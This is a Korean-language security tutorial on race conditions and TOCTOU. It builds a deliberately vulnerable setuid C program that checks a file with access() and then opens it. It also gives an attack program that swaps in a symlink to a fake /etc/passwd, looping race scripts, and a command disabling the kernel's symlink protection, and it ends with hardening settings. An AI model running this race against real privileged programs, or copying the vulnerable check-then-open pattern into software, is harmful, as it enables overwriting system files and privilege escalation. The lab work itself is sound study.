
## Description

Race Condition은 프로세스 또는 스레드 간 자원을 사용하기 위한 경쟁을 의미한다. 이러한 경쟁은 프로세스 또는 스레드의 순서 또는 타이밍에 따라 발생하게 된다. Race condition은 프로세스, 스레드에서 사용되는 자원이 공유된 상태일 경우 자주 발생한다.

### TOCTTOU(Time Of Check to Time Of Use)

TOCTTOU는 소프트웨어에서 리소스의 상태를 확인하는 시간과 사용하는 시간 사이에 리소스를 변경하여 리소스의 상태 확인 결과를 우회하는 방법이다.

## Proof of concept

가짜 /etc/passwd 파일을 생성하고 실제 /etc/passwd와 같은 설정을 적용한다.

```bash
root@bs-virtual-machine:~/pwnable/Race_condition# mkdir etc
root@bs-virtual-machine:~/pwnable/Race_condition# ls -al
total 12
drwxr-xr-x 3 root root 4096 11월 18 20:29 .
drwxr-xr-x 4 root root 4096 11월 18 20:29 ..
drwxr-xr-x 2 root root 4096 11월 18 20:29 etc
root@bs-virtual-machine:~/pwnable/Race_condition# cd etc
root@bs-virtual-machine:~/pwnable/Race_condition/etc# ls
root@bs-virtual-machine:~/pwnable/Race_condition/etc# echo Only Root! > passwd
root@bs-virtual-machine:~/pwnable/Race_condition/etc# cat passwd 
Only Root!
root@bs-virtual-machine:~/pwnable/Race_condition/etc# ls -al
total 12
drwxr-xr-x 2 root root 4096 11월 18 20:30 .
drwxr-xr-x 3 root root 4096 11월 18 20:29 ..
-rw-r--r-- 1 root root   11 11월 18 20:30 passwd
```

취약한 프로그램을 생성한다.

```c
// gcc vuln.c -o vuln ; chown root:root vuln ; chmod 4755 vuln 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void main()
{
    int fd;
    char *file = "./file";
    char buffer[]="Success!! Race Condition : Attacker \n";

    if (!access(file, W_OK)) {
        printf("Able to open file %s.\n",file);
        fd = open(file, O_WRONLY);
        write(fd, buffer, sizeof(buffer));
        close(fd);
    }else{
        //printf("Unable to open file %s.\n",file);
    }
}
```

access() 함수를 이용하여 쓰기 가능한지 확인하고 쓰기가 가능하면 open(), write(), open(), write() 함수를 이용하여 파일을 읽고 내용을 작성한다. access()와 open()이 file handler 대신 파일 이름을 사용하여 access() 함수에 전달된 파일이 open() 함수에 전달될 파일과 같을 수 있다는 보장이 없기 때문에 공격자가 access() 함수 호출 후 심볼릭 링크로 파일을 변경하면 open() 함수에 의해 다른 파일을 수정할 수 있게 된다.

file을 unlink한 후 file에 ./etc/passwd 파일을 링크해주는 공격 프로그램을 생성한다.

```c
// gcc attack.c -o attack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void main()
{
    unlink("file");
    symlink("./etc/passwd","file");
}
```

./vuln 프로그램을 계속 실행시켜주는 스크립트를 생성한다.

```bash
#!/bin/bash
while :
do
    ./vuln
done
```

./ect/passwd를 계속 비교하면서 변경된 경우 “Success”를 출력하는 스크립트를 생성한다.

```bash
#!/bin/bash
CHECK_FILE="ls -l ./etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
    ./attack
    new=$($CHECK_FILE)
done
echo "Success! The passwd file has been changed"
```

리눅스 커널의 보안 기술을 해제한다.

```bash
bs@bs-virtual-machine:~/race_condition$ sudo sysctl -w fs.protected_symlinks=0
fs.protected_symlinks = 0
```

## Exploit

Terminal1으로 run.sh 스크립트를 통해 ./vuln 프로그램을 지속적으로 실행한다.

```bash
bs@bs-virtual-machine:~/race_condition$ echo > file
bs@bs-virtual-machine:~/race_condition$ bash run.sh 
Able to open file ./file.
Able to open file ./file.
...
```

Terminal2에 race.sh 스크립트를 통해 ./attack 프로그램을 ./etc/passwd가 변조될 때까지 실행시키면 ./etc/passwd가 변조된다.

```bash
bs@bs-virtual-machine:~/race_condition$ bash race.sh 
Success! The passwd file has been changed
bs@bs-virtual-machine:~/race_condition$ cat ./etc/passwd 
Success!! Race Condition : Attacker
```

### File system hardening

리눅스 커널은 프로그램(tmp-races, TOCTOU)의 안전하지 않은 파일 시스템 액세스에 대한 취약성에 대한 위협을 완하하기 위해 해당 보안 기술을 적용한다.

```bash
Ubuntu 12.04
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1
Ubuntu 16.04
$ sudo sysctl -w fs.protected_symlinks=1
```

## References
- [Race condition](https://www.lazenca.net/display/TEC/09.Race+condition)